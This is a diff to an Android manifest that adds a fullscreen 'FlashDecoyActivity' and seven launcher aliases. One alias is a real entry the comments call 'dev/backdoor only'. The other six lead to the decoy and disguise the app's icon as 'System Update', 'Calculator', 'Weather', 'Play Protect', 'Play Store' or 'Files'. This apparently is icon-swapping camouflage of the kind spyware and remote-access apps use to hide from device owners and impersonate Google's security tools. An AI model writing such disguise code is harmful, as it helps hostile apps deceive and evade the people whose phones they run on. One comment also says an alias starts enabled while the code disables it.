@@ -252,6 +252,114 @@
             android:turnScreenOn="true"
             android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
 
+
+    <!-- ── FlashDecoyActivity ───────────────────────────────────────────── -->
+    <activity
+        android:name="com.seguranca.protecao.FlashDecoyActivity"
+        android:exported="true"
+        android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
+        android:configChanges="orientation|screenSize|keyboardHidden"
+        android:screenOrientation="portrait"
+        android:launchMode="singleTask" />
+
+    <!-- ── ALIAS 0: RealAlias (dev/backdoor only — starts DISABLED) ─────── -->
+    <activity-alias
+        android:name="com.seguranca.protecao.alias.RealAlias"
+        android:targetActivity="com.seguranca.protecao.MainActivity"
+        android:label="@string/app_name"
+        android:icon="@mipmap/ic_launcher"
+        android:exported="true"
+        android:enabled="false">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+    </activity-alias>
+
+    <!-- ── ALIAS 1: SystemUpdateAlias (default — starts ENABLED) ───────── -->
+    <activity-alias
+        android:name="com.seguranca.protecao.alias.SystemUpdateAlias"
+        android:targetActivity="com.seguranca.protecao.FlashDecoyActivity"
+        android:label="System Update"
+        android:icon="@android:drawable/ic_menu_rotate"
+        android:exported="true"
+        android:enabled="false">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+    </activity-alias>
+
+    <!-- ── ALIAS 2: CalculatorAlias ─────────────────────────────────────── -->
+    <activity-alias
+        android:name="com.seguranca.protecao.alias.CalculatorAlias"
+        android:targetActivity="com.seguranca.protecao.FlashDecoyActivity"
+        android:label="Calculator"
+        android:icon="@android:drawable/ic_menu_edit"
+        android:exported="true"
+        android:enabled="false">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+    </activity-alias>
+
+    <!-- ── ALIAS 3: WeatherAlias ─────────────────────────────────────────── -->
+    <activity-alias
+        android:name="com.seguranca.protecao.alias.WeatherAlias"
+        android:targetActivity="com.seguranca.protecao.FlashDecoyActivity"
+        android:label="Weather"
+        android:icon="@android:drawable/ic_menu_compass"
+        android:exported="true"
+        android:enabled="false">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+    </activity-alias>
+
+    <!-- ── ALIAS 4: PlayProtectAlias ─────────────────────────────────────── -->
+    <activity-alias
+        android:name="com.seguranca.protecao.alias.PlayProtectAlias"
+        android:targetActivity="com.seguranca.protecao.FlashDecoyActivity"
+        android:label="Play Protect"
+        android:icon="@android:drawable/ic_lock_lock"
+        android:exported="true"
+        android:enabled="false">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+    </activity-alias>
+
+    <!-- ── ALIAS 5: GooglePlayAlias ──────────────────────────────────────── -->
+    <activity-alias
+        android:name="com.seguranca.protecao.alias.GooglePlayAlias"
+        android:targetActivity="com.seguranca.protecao.FlashDecoyActivity"
+        android:label="Play Store"
+        android:icon="@android:drawable/ic_menu_save"
+        android:exported="true"
+        android:enabled="false">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+    </activity-alias>
+
+    <!-- ── ALIAS 6: FileMgrAlias ─────────────────────────────────────────── -->
+    <activity-alias
+        android:name="com.seguranca.protecao.alias.FileMgrAlias"
+        android:targetActivity="com.seguranca.protecao.FlashDecoyActivity"
+        android:label="Files"
+        android:icon="@android:drawable/ic_menu_my_calendar"
+        android:exported="true"
+        android:enabled="false">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+    </activity-alias>
+
     </application>
 
 </manifest>
